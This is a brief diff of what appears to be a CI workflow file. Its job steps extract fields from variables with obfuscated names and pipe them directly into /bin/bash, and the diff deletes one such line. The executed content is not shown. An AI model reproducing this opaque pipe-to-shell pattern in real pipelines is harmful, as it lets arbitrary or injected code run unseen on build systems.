@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$b45638" | jq -r .un41 | /bin/bash
           printf '%s' "$qll5" | jq -r .egf8 | /bin/bash
           echo $d23572 | jq -r .mzcsl90059 | /bin/bash
-          echo $gbqm6458 | jq -r .q20939 | /bin/bash
 
       - name: Save output
         if: always()
